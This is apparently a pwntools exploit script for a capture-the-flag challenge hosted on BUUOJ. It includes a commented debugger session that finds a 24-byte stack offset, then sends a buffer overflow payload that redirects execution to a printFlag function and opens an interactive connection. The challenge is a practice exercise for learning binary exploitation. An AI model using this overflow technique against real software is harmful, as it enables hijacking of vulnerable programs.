from pwn import *

r = remote('node5.buuoj.cn', 27133)
context.log_level = 'debug'

'''
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/kali/pwn_test/bbys_tu_2016 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
This program is hungry. You should feed it.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Do you feel the flow?

Program received signal SIGSEGV, Segmentation fault.
0x61616167 in ?? ()
pwndbg> cyclic -l 0x61616167
Finding cyclic pattern of 4 bytes: b'gaaa' (hex: 0x67616161)
Found at offset 24
'''
printFlag_addr = 0x804856D
main_addr = 0x80485C9

# 调试偏移为 24
payload = b'A' * (24) + p32(printFlag_addr) + p32(main_addr)
r.sendline(payload)
r.interactive()
